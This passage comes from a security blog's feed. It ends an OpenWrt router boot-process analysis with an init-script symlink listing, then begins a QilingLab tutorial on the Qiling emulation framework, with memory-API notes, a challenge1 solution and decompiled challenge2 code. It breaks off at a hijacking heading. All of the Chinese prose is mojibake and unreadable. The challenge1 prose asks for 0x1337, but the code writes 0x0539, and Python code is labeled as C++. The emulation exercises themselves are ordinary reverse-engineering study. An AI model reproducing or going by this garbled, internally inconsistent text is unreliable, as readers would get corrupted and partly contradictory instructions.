class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S60collectd -&gt; ../init.d/collectd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S60dnsmasq -&gt; ../init.d/dnsmasq</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S60pptpd -&gt; ../init.d/pptpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S60url_filter -&gt; ../init.d/url_filter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S60xl2tpd -&gt; ../init.d/xl2tpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S62vpn_wan -&gt; ../init.d/vpn_wan</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S65wifidog -&gt; ../init.d/wifidog</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S69ipstat -&gt; ../init.d/ipstat</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S69online -&gt; ../init.d/online</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S70freeStrategy -&gt; ../init.d/freeStrategy</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S70init_iface -&gt; ../init.d/init_iface</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S70qca-nss-drv -&gt; ../init.d/qca-nss-drv</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S70qca-nss-ecm -&gt; ../init.d/qca-nss-ecm</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S72shortcut-fe -&gt; ../init.d/shortcut-fe</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S76session_limits -&gt; ../init.d/session_limits</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S80websort -&gt; ../init.d/websort</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S83web_security -&gt; ../init.d/web_security</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S85webfilter -&gt; ../init.d/webfilter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S89remote_mngt -&gt; ../init.d/remote_mngt</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S90dnsproxy -&gt; ../init.d/dnsproxy</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S93appdist -&gt; ../init.d/appdist</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S93bwlist_qq -&gt; ../init.d/bwlist_qq</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S93done -&gt; ../init.d/done</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S93l2tp -&gt; ../init.d/l2tp</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S93mwan3 -&gt; ../init.d/mwan3</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">25</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S94default_balance -&gt; ../init.d/default_balance</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S94isp_route -&gt; ../init.d/isp_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S94load_balance -&gt; ../init.d/load_balance</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S94miniupnpd -&gt; ../init.d/miniupnpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S94policy_route -&gt; ../init.d/policy_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S94static_route -&gt; ../init.d/static_route</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S94sysntpd -&gt; ../init.d/sysntpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S95ipsec -&gt; ../init.d/ipsec</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S96cloud_sdk -&gt; ../init.d/cloud_sdk</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97cloud_client -&gt; ../init.d/cloud_client</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97cmxddns -&gt; ../init.d/cmxddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97dev_discover -&gt; ../init.d/dev_discover</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97dyn3322ddns -&gt; ../init.d/dyn3322ddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97luci_monitor -&gt; ../init.d/luci_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97phddns -&gt; ../init.d/phddns</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97storage_share -&gt; ../init.d/storage_share</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97sys_ha -&gt; ../init.d/sys_ha</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97sys_monitor -&gt; ../init.d/sys_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97system_params -&gt; ../init.d/system_params</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97tpddnsd -&gt; ../init.d/tpddnsd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S97uhttpd -&gt; ../init.d/uhttpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S98apdb_check -&gt; ../init.d/apdb_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S98led -&gt; ../init.d/led</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S98uac -&gt; ../init.d/uac</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S98zero_boot_done -&gt; ../init.d/zero_boot_done</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">27</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S99commit_sysupgrade -&gt; ../init.d/commit_sysupgrade</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S99devmngr -&gt; ../init.d/devmngr</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S99powerctl -&gt; ../init.d/powerctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S99thermal -&gt; ../init.d/thermal</span><br></pre></td></tr></table></figure><p>å³æ‰§è¡Œ&#x2F;etc&#x2F;init.d&#x2F;ä¸‹çš„æ‰€æœ‰æœåŠ¡</p><p><strong>è‡³æ­¤å¯åŠ¨æµç¨‹åˆ†æå®Œæ¯•</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹&quot;&gt;&lt;a href=&quot;#openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹&quot; class=&quot;headerlink&quot; title=&quot;openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹&quot;&gt;&lt;/a&gt;openwrtè·¯ç”±å™¨å¯åŠ¨æµç¨‹&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot;</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="openwrt" scheme="http://s1nec-1o.github.io/tags/openwrt/"/>
    
  </entry>
  
  <entry>
    <title>åˆæ¢Qiling framework</title>
    <link href="http://s1nec-1o.github.io/2024/11/23/%E5%88%9D%E6%8E%A2Qiling-framework/"/>
    <id>http://s1nec-1o.github.io/2024/11/23/%E5%88%9D%E6%8E%A2Qiling-framework/</id>
    <published>2024-11-23T07:04:30.000Z</published>
    <updated>2024-11-23T07:10:17.437Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åšå®Œè¿™äº›labï¼Œå¯¹qilingçš„ä½œç”¨ï¼Œè¿™ä¸ªframeworkçš„ç†è§£ï¼Œæ›´åŠ çš„æ·±ï¼Œå¸Œæœ›çœ‹åˆ°è¿™é‡Œçš„è¯»è€…å¯ä»¥è‡ªå·±å»åšä¸€éï¼Œä¸è¦çº¯çœ‹ä»–äººçš„wpï¼Œå› ä¸ºæ¯é“é¢˜éƒ½æœ‰ç€å¾ˆå¤šç§è§£æ³•ï¼Œä½†æ˜¯ç›®æ ‡éƒ½æ˜¯æˆåŠŸçš„hookæˆ–Hijackï¼ŒQilingè¿˜æœ‰ç€ä¸€äº›fuzz or ä»¿çœŸçš„ exampleï¼Œæˆ‘éƒ½ä¼šå»åšä¸€éçš„ï¼åŒæ—¶æ¥ä¸‹æ¥æ¯å‘¨éƒ½æœ‰ç€å¾ˆå¤šè€ƒè¯•ï¼Œå¸Œæœ›ä¸€åˆ‡é¡ºåˆ©~</p><h2 id="What-is-Qiling"><a href="#What-is-Qiling" class="headerlink" title="What is Qiling"></a>What is Qiling</h2><p>Qilingæ˜¯ä¸€ä¸ªå…ˆè¿›çš„äºŒè¿›åˆ¶ä»¿çœŸæ¡†æ¶ï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li><strong>Qiling</strong> è¿™ä¸ªæ¡†æ¶å¯¹äºæ¨¡æ‹Ÿè¿è¡ŒäºŒè¿›åˆ¶ç¨‹åºæ—¶çš„ hook éå¸¸æ–¹ä¾¿</li><li>æ¨¡æ‹Ÿå¤šå¹³å°ï¼šWindowsã€MacOSã€Linuxã€Androidã€BSDã€UEFIã€DOSã€MBRã€ä»¥å¤ªåŠè™šæ‹Ÿæœº</li><li>æ¨¡æ‹Ÿå¤šæ¶æ„ï¼š8086ã€X86ã€X86_64ã€ARMã€ARM64ã€MIPSã€RISCVã€PowerPC</li><li>å†…ç½®è°ƒè¯•å™¨ï¼Œå…·æœ‰é€†å‘è°ƒè¯•åŠŸèƒ½</li><li>æä¾›æ·±å…¥çš„å†…å­˜ã€å¯„å­˜å™¨ã€æ“ä½œç³»ç»Ÿçº§å’Œæ–‡ä»¶ç³»ç»Ÿçº§API</li><li>ç»†ç²’åº¦æ£€æµ‹ï¼šå…è®¸åœ¨å„ä¸ªçº§åˆ«è¿›è¡ŒæŒ‚é’©ï¼ˆæŒ‡ä»¤&#x2F;åŸºæœ¬å—&#x2F;å†…å­˜è®¿é—®&#x2F;å¼‚å¸¸&#x2F;ç³»ç»Ÿè°ƒç”¨&#x2F;IO&#x2F;ç­‰ï¼‰</li><li>æ”¯æŒè·¨æ¶æ„å’Œå¹³å°è°ƒè¯•èƒ½åŠ›</li><li>çœŸæ­£çš„Pythonæ¡†æ¶ï¼Œå¯ä»¥è½»æ¾åœ°åœ¨å…¶ä¸Šæ„å»ºå®šåˆ¶çš„å®‰å…¨åˆ†æå·¥å…·</li><li>ç­‰ç­‰</li></ul><p>åœ¨qiling frameworkçš„githubé¡¹ç›®ä¸Šè¿˜æœ‰å‡ ä¸ªç¤ºä¾‹demoï¼Œè¿™é‡Œæ³¨æ„åˆ°äº†é€šè¿‡Qilingæ¡†æ¶ä»¿çœŸæ¨¡æ‹Ÿå¹¶å¯¹äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œhookå¯ä»¥æ›´åŠ æ–¹ä¾¿çš„fuzz</p><h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><p>è¦æ±‚åœ¨0x1337åœ°å€ä¸Šå†™å…¥0x1337</p><table><thead><tr><th align="left">Method</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left"><code>map</code></td><td align="left">Map a memory region at a certain location so it become available for access</td></tr><tr><td align="left"><code>unmap</code></td><td align="left">Reclaim a mapped memory region</td></tr><tr><td align="left"><code>unmap_all</code></td><td align="left">Reclaim all mapped memory regions</td></tr><tr><td align="left"><code>map_anywhere</code></td><td align="left">Map a memory region in an unspecified location</td></tr><tr><td align="left"><code>protect</code></td><td align="left">Modify access protection bits of a mapped region (rwx)</td></tr><tr><td align="left"><code>find_free_space</code></td><td align="left">Find an available memory region</td></tr><tr><td align="left"><code>is_available</code></td><td align="left">Query whether a memory region is available</td></tr><tr><td align="left"><code>is_mapped</code></td><td align="left">Query whether a memory region is mapped</td></tr></tbody></table><p>Qilingç»™å‡ºäº†è¿™äº›Managing memoryçš„æ–¹æ³•</p><p>å†…å­˜åœ¨è¢«è®¿é—®ä¹‹å‰å¿…é¡»è¢«æ˜ å°„ã€‚ <code>map</code>æ–¹æ³•å°†è¿ç»­çš„å†…å­˜åŒºåŸŸç»‘å®šåˆ°æŒ‡å®šä½ç½®ï¼Œå¹¶è®¾ç½®å…¶è®¿é—®ä¿æŠ¤ä½ã€‚å¯ä»¥æä¾›å­—ç¬¦ä¸²æ ‡ç­¾ä»¥ä¾¿åœ¨æ˜ å°„ä¿¡æ¯è¡¨ä¸Šè½»æ¾è¯†åˆ«</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.<span class="built_in">map</span>(addr: <span class="built_in">int</span>, size: <span class="built_in">int</span>, perms: <span class="built_in">int</span> = UC_PROT_ALL, info: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>) -&gt; <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>å‚æ•°ï¼š-<code>addr</code> - è¯·æ±‚çš„æ˜ å°„åŸºåœ°å€ï¼Œåº”è¯¥åœ¨é¡µé¢ç²’åº¦ä¸Šï¼›- <code>size</code> - æ˜ å°„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œå¿…é¡»æ˜¯é¡µé¢å¤§å°ï¼› - <code>perms</code> - ä¿æŠ¤ä½å›¾çš„ä¹˜ç§¯ï¼Œå®šä¹‰æ­¤å†…å­˜èŒƒå›´æ˜¯å¦å¯è¯»ã€å¯å†™å’Œ&#x2F;æˆ–å¯æ‰§è¡Œï¼ˆå¯é€‰ï¼‰ï¼› - <code>info</code> - å°†å­—ç¬¦ä¸²æ ‡ç­¾è®¾ç½®ä¸ºæ˜ å°„èŒƒå›´ä»¥æ–¹ä¾¿è¯†åˆ«ï¼ˆå¯é€‰ï¼‰</p><p>ä¸»è¦ä¹Ÿæ˜¯å…³æ³¨å‰ä¸¤ä¸ªå‚æ•°ï¼Œè¿™é‡Œæ˜¾ç„¶æ˜¯æ‰§è¡Œ <code>ql.mem.map(0x1337// 4096 * 4096 , 0x1000);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.unmap(addr: <span class="built_in">int</span>, size: <span class="built_in">int</span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure><p>å‚æ•°ï¼š - <code>addr</code> - è¦å–æ¶ˆæ˜ å°„çš„åŒºåŸŸåŸºåœ°å€ - <code>size</code> - åŒºåŸŸå¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</p><p>å¦‚æœè¯·æ±‚çš„å†…å­˜èŒƒå›´æœªå®Œå…¨æ˜ å°„ï¼Œåˆ™å¼•å‘ï¼š <code>QlMemoryMappedError</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = ql.mem.search(<span class="string">b&quot;\xFF\xFE\xFD\xFC\xFB\xFA&quot;</span>, begin= <span class="number">0x1000</span>, end= <span class="number">0x2000</span>)</span><br></pre></td></tr></table></figure><p>ä»éƒ¨åˆ†å†…å­˜èŒƒå›´ä¸­æœç´¢å­—ç¬¦ä¸²ï¼Œbeginå’Œendå‚æ•°å‡æ˜¯å¯é€‰çš„ï¼Œå»é™¤åˆ™æ˜¯æ•´ä¸ªå†…å­˜èŒƒå›´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.read(address, size)</span><br></pre></td></tr></table></figure><p>ä»å†…å­˜ä¸­è¯»å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.write(address, data)</span><br></pre></td></tr></table></figure><p>å†™å…¥å†…å­˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">challenge1</span><span class="params">(ql)</span>:</span></span><br><span class="line"><span class="function">ql.mem.map(<span class="number">0x1337</span>//<span class="number">4096</span>*<span class="number">4096</span> , <span class="number">0x1000</span>)</span></span><br><span class="line"><span class="function">ql.mem.write(<span class="number">0x1337</span>, b<span class="string">&quot;\x39\x05&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1CCh]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-1C8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-1C4h]</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">utsname</span> name; <span class="comment">// [rsp+20h] [rbp-1C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+1A6h] [rbp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">24</span>]; <span class="comment">// [rsp+1B0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+1C8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">uname</span>(&amp;name) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;uname&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(s, <span class="string">&quot;QilingOS&quot;</span>);</span><br><span class="line">    s[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(v8, <span class="string">&quot;ChallengeStart&quot;</span>);</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( name.sysname[v4] == s[v4] )</span><br><span class="line">        ++v2;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( name.version[v5] == v8[v5] )</span><br><span class="line">        ++v3;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="built_in">strlen</span>(s) &amp;&amp; v3 == <span class="built_in">strlen</span>(v8) &amp;&amp; v2 &gt; <span class="number">5</span> )</span><br><span class="line">      *a1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚åœ¨unameè¿”å›ç³»ç»Ÿä¿¡æ¯æ—¶çš„<code>sysname == &quot;QilingOS&quot; and version == &quot;ChallengeStart&quot;</code>ã€‚</p><p>éœ€è¦é€šè¿‡åŠ«æŒç»“æ„ä½“</p><h4 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h4><p>POSIX 